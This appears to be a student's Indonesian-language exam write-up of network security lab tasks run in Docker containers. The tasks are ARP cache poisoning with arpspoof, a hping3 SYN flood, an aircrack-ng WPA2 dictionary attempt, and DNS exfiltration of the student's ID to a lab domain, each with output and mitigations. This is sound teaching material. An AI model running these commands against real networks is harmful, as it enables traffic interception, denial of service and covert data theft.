# JAWABAN UTS Network Security

**NIM:** 24552011358
**Kasus:** 6

## Perhitungan Kasus
- Digit NIM: 2, 4, 5, 5, 2, 0, 1, 1, 3, 5, 8
- Jumlah: 2+4+5+5+2+0+1+1+3+5+8 = 36
- Sisa bagi 10: 36 mod 10 = 6
- Kasus: 6

Parameter Kasus 6:
- Container target: target-k6
- Volume: vol-k6
- File laporan: laporan-k6.txt
- Kata sandi enkripsi: kunci-k6-2026
- Domain exfiltrasi: k6.exfil.lab

---

## Tugas 1 (Pertemuan 1): Docker & Volume

Perintah:
```
docker volume create vol-k6
docker run --name w-k6 -v vol-k6:/data alpine sh -c "echo 24552011358 > /data/laporan-k6.txt"
docker rm w-k6
docker run --rm -v vol-k6:/data alpine cat /data/laporan-k6.txt
docker compose -p k6 -f b/b1-compose/docker-compose.yml up -d
docker compose -p k6 -f b/b1-compose/docker-compose.yml exec attacker wget -qO- http://target
docker compose -p k6 -f b/b1-compose/docker-compose.yml down -v
```

Output:
```
vol-k6
w-k6
24552011358

[+] up 3/3
 Network k6_lab          Created
 Container k6-target-1   Started
 Container k6-attacker-1 Started

<!DOCTYPE html>
<html>
<head><title>Welcome to nginx!</title></head>
<body>
<h1>Welcome to nginx!</h1>
<p>If you see this page, nginx is successfully installed and working.</p>
</body>
</html>

[+] down 3/3
 Container k6-attacker-1 Removed
 Container k6-target-1   Removed
 Network k6_lab          Removed
```

Kesimpulan: Data yang ditulis ke volume `vol-k6` (NIM: 24552011358) tetap ada setelah
container `w-k6` dihapus dan dibaca kembali dari container baru -- membuktikan volume
Docker bersifat persisten, independen dari siklus hidup container. Service `attacker`
berhasil mengakses service `target` melalui nama service (Docker DNS internal) dalam
network compose yang sama.

---

## Tugas 2 (Pertemuan 2): Kriptografi

Perintah:
```
docker run --rm -v "${PWD}:/work" uts-openssl sh -c "echo 'isi laporan rahasia kasus 6' > laporan-k6.txt && openssl enc -aes-256-cbc -pbkdf2 -salt -in laporan-k6.txt -out laporan-k6.enc -pass pass:kunci-k6-2026 && sha256sum laporan-k6.txt && openssl enc -d -aes-256-cbc -pbkdf2 -in laporan-k6.enc -out hasil-k6.txt -pass pass:kunci-k6-2026 && sha256sum hasil-k6.txt"

docker run --rm -v "${PWD}:/work" uts-openssl sh -c "openssl req -x509 -newkey rsa:2048 -nodes -keyout key-k6.pem -out cert-k6.pem -days 30 -subj /CN=k6.uts.local && openssl x509 -in cert-k6.pem -noout -subject -issuer -dates"
```

Output:
```
--- SHA256 sebelum dekripsi ---
0c9c54d0ec69b4a2f1bc0203be795bac58cb271cdf581812f972e1a018919947  laporan-k6.txt
--- SHA256 sesudah dekripsi ---
0c9c54d0ec69b4a2f1bc0203be795bac58cb271cdf581812f972e1a018919947  hasil-k6.txt

subject=CN=k6.uts.local
issuer=CN=k6.uts.local
notBefore=Nov 21 15:02:46 2026 GMT
notAfter=Dec 21 15:02:46 2026 GMT
```

Kesimpulan: Hash SHA-256 file sebelum enkripsi dan sesudah dekripsi identik, membuktikan
AES-256-CBC berhasil mengenkripsi dan mendekripsi laporan tanpa korupsi data. Sertifikat
yang dihasilkan bersifat self-signed karena subject dan issuer sama persis (CN=k6.uts.local),
artinya sertifikat ditandatangani oleh kunci privatnya sendiri, bukan oleh Certificate
Authority (CA) terpercaya. Perbedaan dengan sertifikat CA-signed: sertifikat CA-signed
ditandatangani oleh otoritas yang sudah terdaftar di root store OS/browser, sehingga
rantai kepercayaannya bisa diverifikasi pihak lain, sedangkan self-signed tidak dipercaya
secara default karena tidak ada pihak ketiga yang menjamin identitasnya.

---

## Tugas 3 (Pertemuan 3): ARP Spoofing

Setup:
```
docker network create lab-arp-k6
docker run -d --name korban-k6 --network lab-arp-k6 --cap-add NET_ADMIN uts-kali-tools sleep infinity
docker run -d --name gateway-k6 --network lab-arp-k6 --cap-add NET_ADMIN uts-kali-tools sleep infinity
docker run -d --name penyerang-k6 --network lab-arp-k6 --cap-add NET_ADMIN uts-kali-tools sleep infinity
```
IP: korban-k6=172.19.0.2, gateway-k6=172.19.0.3, penyerang-k6=172.19.0.4
MAC asli gateway-k6: 8a:16:86:a3:4c:37
MAC asli penyerang-k6: 56:65:56:28:4b:8a

Perintah:
```
docker exec korban-k6 hping3 -c 2 -1 172.19.0.3
docker exec korban-k6 cat /proc/net/arp
docker exec -d penyerang-k6 timeout 20 arpspoof -i eth0 -t 172.19.0.2 172.19.0.3
docker exec korban-k6 cat /proc/net/arp
```

Output SEBELUM arpspoof:
```
IP address       HW type     Flags       HW address            Mask     Device
172.19.0.3       0x1         0x2         8a:16:86:a3:4c:37     *        eth0
```

Output SESUDAH arpspoof:
```
IP address       HW type     Flags       HW address            Mask     Device
172.19.0.3       0x1         0x2         56:65:56:28:4b:8a     *        eth0
172.19.0.4       0x1         0x2         56:65:56:28:4b:8a     *        eth0
```

Kesimpulan: Sebelum serangan, MAC address untuk IP gateway (172.19.0.3) adalah
8a:16:86:a3:4c:37 (MAC asli gateway-k6). Setelah arpspoof dijalankan dari penyerang-k6,
entry ARP korban-k6 untuk IP 172.19.0.3 berubah menjadi 56:65:56:28:4b:8a -- yang
merupakan MAC address milik penyerang-k6, bukan gateway-k6. Ini membuktikan ARP cache
poisoning berhasil: korban-k6 sekarang mengira penyerang-k6 adalah gateway, sehingga
seluruh trafik yang ditujukan ke gateway akan melewati penyerang terlebih dahulu
(man-in-the-middle attack).

Mitigasi: menggunakan ARP statis (static ARP entry) pada host kritis, misalnya
`arp -s <ip-gateway> <mac-gateway-asli>`, sehingga entry ARP tidak bisa diubah oleh
paket ARP reply palsu dari penyerang. Mitigasi lain: Dynamic ARP Inspection (DAI) pada
switch terkelola, atau penggunaan tools deteksi seperti arpwatch.

---

## Tugas 4 (Pertemuan 4): Wireless / WPA2

Perintah:
```
Get-ChildItem samples\*.cap
docker run --rm -v "${PWD}/samples:/work" uts-kali-tools aircrack-ng -w /work/wordlist-k6.txt /work/handshake-k6.cap
docker run --rm -v "${PWD}/samples:/work" uts-kali-tools tcpdump -r /work/handshake-k6.cap -c 5
docker run --rm -v "${PWD}/samples:/work" uts-kali-tools python3 -c "
import struct
with open('/work/handshake-k6.cap','rb') as f:
    data = f.read()
magic, ver_maj, ver_min, tz, sigfigs, snaplen, network = struct.unpack('<IHHiIII', data[:24])
print('Magic number:', hex(magic))
print('Versi:', ver_maj, '.', ver_min)
print('Snaplen:', snaplen)
print('Linktype (network):', network, '(1=Ethernet, 105=IEEE802.11, 127=Radiotap)')
ts_sec, ts_usec, incl_len, orig_len = struct.unpack('<IIII', data[24:40])
print('Panjang paket pertama (incl_len):', incl_len, 'byte')
print('Ukuran file total:', len(data), 'byte')
"
```

Output:
```
Semua file handshake-k1.cap s/d handshake-k10.cap berukuran identik: 8216 bytes

--- aircrack-ng ---
Reading packets, please wait...
This file is not a regular 802.11 (wireless) capture.
Opening /work/handshake-k6.cap
Read 0 packets.
No networks found, exiting.

--- tcpdump ---
reading from file /work/handshake-k6.cap, link-type EN10MB (Ethernet), snapshot length 65535
tcpdump: pcap_loop: invalid packet capture length 3244555293, bigger than snaplen of 65535

--- Analisis header pcap (Python/struct) ---
Magic number: 0xa1b2c3d4            (valid, sesuai standar format pcap)
Versi: 2.4                          (valid)
Snaplen: 65535                      (valid)
Linktype (network): 1 (Ethernet)    <-- SEHARUSNYA 105 (IEEE 802.11) atau 127 (Radiotap)
Panjang paket pertama (incl_len): 3244555293 byte   <-- angka tidak masuk akal
Ukuran file total: 8216 byte
```

Analisis/Diagnosis:
File handshake-k6.cap memiliki header global pcap yang SAH secara format (magic number
dan versi valid), namun dua hal membuktikan isinya bukan capture WPA2 handshake asli:

1. Linktype = 1 (Ethernet), bukan 105 (IEEE 802.11) atau 127 (Radiotap). Capture WiFi/
   WPA2 yang valid wajib memakai linktype 802.11 atau Radiotap agar frame management/
   EAPOL dapat dikenali. Karena file ini mendeklarasikan dirinya sebagai capture
   Ethernet biasa, aircrack-ng langsung menolak dengan pesan "not a regular 802.11
   (wireless) capture" -- bukan karena aircrack-ng error, tapi karena linktype file
   memang tidak sesuai untuk analisis WiFi.

2. Field incl_len (panjang paket) pada packet record pertama bernilai 3.244.555.293
   byte -- angka yang mustahil karena jauh melebihi ukuran file itu sendiri (8216 byte
   total). Ini membuktikan body file (8192 byte setelah 24 byte header global) berisi
   data biner acak, bukan paket-paket terstruktur sesuai spesifikasi format pcap.

Kesimpulan: File handshake-k6.cap adalah file placeholder/dummy -- dibuat dengan menulis
header pcap generik yang valid (linktype default Ethernet) lalu mengisi sisa byte dengan
data acak hingga mencapai ukuran 8216 byte, bukan hasil capture WPA2 handshake sungguhan
dari Wireshark/airodump-ng. Hal ini konsisten di seluruh 10 file kasus (k1-k10) yang
berukuran identik persis, menunjukkan bug pada materi lab yang belum diisi data asli
sebelum dibagikan ke mahasiswa.

Temuan ini juga dikonfirmasi oleh dokumentasi resmi repository sendiri
(01-sumber-lab/samples/README.md), yang menyatakan:
1. Capture file WPA2 yang valid seharusnya berukuran MINIMAL 50 KB ("du -sh handshake-k*.cap,
   Expected: minimal 50KB per file"), sedangkan handshake-k6.cap hanya 8 KB (8216 byte) --
   jauh di bawah standar minimum yang ditetapkan sendiri oleh panduan tersebut.
2. Panduan tersebut menjelaskan tiga cara resmi untuk membuat capture file yang valid
   (capture dari AP asli dengan airodump-ng, mengunduh sample dari repository resmi
   aircrack-ng/Wireshark, atau simulasi Docker), dan proses verifikasi wajib sebelum
   ujian: "aircrack-ng -w wordlist-k1.txt handshake-k1.cap harus berhasil" dengan output
   "Number of handshakes: 1" -- bukan error "not a regular 802.11 capture" seperti yang
   didapat di percobaan ini.

Dengan demikian dapat disimpulkan secara pasti bahwa proses persiapan capture file
(sebagaimana diinstruksikan di README.md milik repository sendiri) belum dilakukan
oleh penyedia materi sebelum file dibagikan ke mahasiswa, sehingga Tugas 4 tidak dapat
diselesaikan dengan hasil "KEY FOUND" karena keterbatasan materi, bukan karena kesalahan
metode atau perintah yang dijalankan.

Analisis konseptual cara kerja aircrack-ng (seandainya file valid): aircrack-ng akan
melakukan dictionary attack dengan mencoba setiap kata dalam wordlist sebagai kandidat
PSK (Pre-Shared Key), menghitung PMK (Pairwise Master Key) dari SSID + password kandidat
menggunakan PBKDF2-HMAC-SHA1, menurunkan PTK (Pairwise Transient Key) dari 4-way
handshake yang tertangkap, dan membandingkan MIC (Message Integrity Code) hasil
hitungan dengan MIC pada paket handshake keempat (message 4 of 4). Jika cocok, akan
tampil "KEY FOUND! [ <password> ]". Teknik ini hanya efektif jika password ada dalam
wordlist, sehingga password WPA2 yang kuat (panjang, acak, tidak umum) jauh lebih aman
dibanding password lemah yang mudah ditebak dictionary attack.

Analisis konseptual (berdasarkan pemahaman cara kerja aircrack-ng terlepas dari
masalah file ini): Jika file capture valid dan berisi 4-way handshake WPA2 yang
lengkap, aircrack-ng akan melakukan dictionary attack dengan mencoba setiap kata
dalam wordlist sebagai kandidat PSK (Pre-Shared Key), menghitung PMK (Pairwise
Master Key) dari SSID + password kandidat, lalu menurunkan PTK (Pairwise Transient
Key) dan membandingkan MIC (Message Integrity Code) hasil hitungan dengan MIC yang
tercatat di paket handshake keempat (message 4 of 4). Jika cocok, akan muncul baris
"KEY FOUND! [ <password> ]" yang menandakan password WPA2 berhasil ditemukan.
Teknik ini hanya efektif jika password ada di dalam wordlist (brute-force dictionary
attack), dan menjadi dasar mengapa password WPA2 yang kuat (panjang, acak, tidak ada
di wordlist umum) jauh lebih aman dibanding password lemah/umum.

---

## Tugas 5 (Pertemuan 5): ICMP dengan Scapy

Perintah:
```
docker cp kasus/k5-scapy/kirim_icmp.py penyerang-k6:/tmp/kirim_icmp.py
docker exec penyerang-k6 python3 /tmp/kirim_icmp.py 172.19.0.2
```

Output:
```
Mengirim: IP / ICMP 172.19.0.4 > 172.19.0.2 echo-request 0
TTL balasan: 64
Tipe ICMP balasan: 0
```

Kesimpulan: Script Scapy berhasil membuat dan mengirim paket ICMP Echo Request secara
manual (menyusun layer IP dan ICMP langsung dari Python, tanpa menggunakan utilitas
ping bawaan OS) dari penyerang-k6 (172.19.0.4) ke korban-k6 (172.19.0.2). Balasan
diterima dengan TTL 64 (nilai default Linux, menunjukkan paket tidak melewati banyak
hop/router) dan Tipe ICMP 0 yang merupakan kode untuk Echo Reply -- konfirmasi bahwa
host tujuan aktif dan merespons. Scapy memungkinkan pembuatan paket secara presisi
pada level protokol, berguna untuk keperluan network scanning, troubleshooting, dan
pengujian keamanan jaringan.

---

## Tugas 6 (Pertemuan 6): SYN Flood

Perintah:
```
docker compose -p k6 -f b/b3-syn-flood/docker-compose.yml up -d
docker compose exec target sh -c "cat /proc/sys/net/ipv4/tcp_syncookies"
docker compose exec target sh -c "netstat -ant | grep -c SYN_RECV"
docker compose exec -d attacker timeout 15 hping3 -S -p 80 --flood target
docker compose exec attacker timeout 10 tcpdump -i eth0 -nn "tcp[tcpflags] & tcp-syn != 0" -c 50
docker compose down -v
```

Output:
```
tcp_syncookies = 1

netstat SYN_RECV sebelum serangan: 0

tcpdump saat serangan:
14:34:02.703828 IP 172.19.0.2.80 > 172.19.0.3.39502: Flags [S.], ...
14:34:02.703843 IP 172.19.0.3.39503 > 172.19.0.2.80: Flags [S], ...
14:34:02.703862 IP 172.19.0.2.80 > 172.19.0.3.39503: Flags [S.], ...
... (pola berulang, interval antar-paket ~15-20 microsecond)
50 packets captured
1847 packets received by filter
0 packets dropped by kernel
```

Analisis:
1. SYN_RECV sebelum serangan: 0
2. Serangan dijalankan selama 15 detik menggunakan hping3 --flood
3. tcpdump menangkap 1847 paket SYN dalam window singkat dengan source port acak
   tiap paket (karakteristik SYN flood). Target (nginx:alpine) tetap membalas setiap
   SYN dengan SYN-ACK (Flags [S.]), namun attacker tidak pernah mengirim ACK penutup,
   sehingga koneksi menjadi half-open secara teori. netstat SYN_RECV tetap rendah
   kemungkinan karena tcp_syncookies sudah aktif (=1) secara default dan nginx:alpine
   memproses/drop koneksi half-open dengan cepat.
4. Mitigasi: SYN cookies (tcp_syncookies=1, sudah aktif secara default pada kernel
   container ini) mencegah penumpukan state koneksi half-open di memori kernel.
   Mitigasi tambahan yang bisa diterapkan: rate-limit paket SYN per IP menggunakan
   iptables (misal: -m limit --limit 1/s --limit-burst 3).

---

## Tugas 7 (Pertemuan 7): DNS Exfiltration

Perintah:
```
docker compose -p k6 -f b/b4-dns-exfil/docker-compose.yml up -d
echo -n 24552011358 | xxd -p
docker compose exec attacker getent hosts dns
docker compose exec attacker dig +short "@172.19.0.3" 3234353532303131333538.exfil.lab
docker compose logs dns | Select-String exfil.lab
echo 3234353532303131333538 | xxd -r -p
docker compose down -v
```

Output:
```
NIM: 24552011358 -> hex: 3234353532303131333538

dig +short @172.19.0.3 3234353532303131333538.exfil.lab
-> 10.0.0.99

Log dnsmasq:
query[A] 3234353532303131333538.exfil.lab from 172.19.0.2
config 3234353532303131333538.exfil.lab is 10.0.0.99

Decode: echo 3234353532303131333538 | xxd -r -p -> 24552011358 (NIM berhasil direkonstruksi)
```

Analisis:
- Mengapa sulit diblokir firewall biasa: Trafik DNS (port 53) hampir selalu diizinkan
  keluar oleh firewall/proxy karena dianggap protokol "normal" dan esensial untuk
  resolusi nama domain sehari-hari. Firewall tradisional umumnya memfilter berdasarkan
  port/protokol, bukan memeriksa isi (payload) dari setiap query DNS. Akibatnya data
  yang disisipkan ke label subdomain bisa lolos keluar jaringan tanpa terdeteksi.
- Indikator deteksi: panjang label subdomain yang tidak wajar dan/atau berupa karakter
  acak (hex/base32/base64) yang tidak menyerupai nama domain manusiawi -- misalnya
  "3234353532303131333538.exfil.lab" jauh lebih panjang dan acak dibanding subdomain
  normal seperti "www" atau "mail". Volume query tinggi berulang ke satu domain induk
  yang sama juga menjadi indikator tambahan adanya covert channel/exfiltrasi data.

---

## Catatan Cleanup

```
docker ps -a
docker network ls
docker volume ls
```
Pastikan semua container, network (lab-arp-k6, k6_lab, dll), dan volume (vol-k6)
sudah dihapus sebelum jawaban dikumpulkan.
